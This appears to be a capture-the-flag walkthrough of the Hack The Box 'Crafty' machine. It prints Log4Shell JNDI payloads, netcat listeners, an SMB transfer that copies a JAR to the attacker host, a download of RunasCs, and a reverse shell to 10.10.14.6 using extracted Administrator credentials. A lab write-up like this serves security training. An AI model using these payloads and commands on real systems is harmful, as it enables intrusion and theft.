## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

## 🔎 Recon

### 🔮 Port Scan
```bash
nmap -p- --min-rate 10000 -oA nmap/alltcp 10.10.11.249
nmap -p 80,25565 -sCV 10.10.11.249
```
- [HTTP](HTTP.md) (80): Microsoft IIS 10.0
- Minecraft (25565): Version 1.16.5 (Crafty Server)

### 🌐 Host Mapping
```bash
echo "10.10.11.249 crafty.htb play.crafty.htb" | sudo tee -a /etc/hosts
```

### 🚀 Web Enumeration
```bash
feroxbuster -u http://crafty.htb \
-w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```
> Found: /home, /coming-soon, /css, /img, /js

---

## 🗰 Minecraft Port 25565

### 🎮 Client: Minecraft Console Client (Free)
```bash
./MinecraftClient-20240415-263-linux-x64 0xdf
```
- Server: crafty.htb
- Version: 1.16.5

### 🔍 Log4Shell Detection
```bash
nc -lnvp 389
# Send in chat:
${jndi:ldap://10.10.14.6/test}
```

---

## 🛡️ Exploit Log4Shell

### ⚙️ Setup
```bash
git clone https://github.com/kozmer/log4j-shell-poc.git
cd log4j-shell-poc
pip install -r requirements.txt
tar xf jdk-8u20-linux-x64.tar.gz
```

### ✊ Fix Payload (Windows)
Edit `poc.py`: `String cmd="cmd.exe";`

### 🎣 Launch Exploit
```bash
nc -lnvp 443
python poc.py --userip 10.10.14.6 --webport 8000 --lport 443
```
Send via chat:
```text
${jndi:ldap://10.10.14.6:1389/a}
```
> Result: Shell as `svc_minecraft`

---

## 🛠️ Privilege Escalation to Administrator

### 📁 Check Plugin Directory
```powershell
cd 'C:\Users\svc_minecraft\server\plugins'
Get-FileHash playercounter-1.0-SNAPSHOT.jar
```

### 🚚 Exfiltrate JAR
```bash
smbserver.py share . -smb2support -username oxdf -password oxdf
```
```powershell
net use \\10.10.14.6\share /u:oxdf oxdf
copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.6\share\
```

### 🔬 Reverse Engineering
- Tool: `jd-gui`
- Credential Found: `Administrator : s67u84zKq8IXw`

### 🔑 Validate with RunasCs
```powershell
wget http://10.10.14.6/RunasCs.exe -outfile RunasCs.exe
.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"
```

### 🚀 Shell as Admin
```powershell
.\RunasCs.exe Administrator s67u84zKq8IXw cmd -r 10.10.14.6:443
```
> Reverse shell as `Administrator`

---

## 🧰 Flags

- **User**: `c:\Users\svc_minecraft\Desktop\user.txt`
- **Root**: `c:\Users\Administrator\Desktop\root.txt`

---

## 🔎 Beyond Root - web.config Analysis

- `index.html` ➔ redirected to `/home`
- `/home` ➔ rewritten to `index.html`
- `/coming-soon` ➔ rewritten to `coming-soon.html`
- Redirects all other non-`crafty.htb` hostnames back to `crafty.htb`

> IIS URL Rewriting explained the static behavior and redirection logic.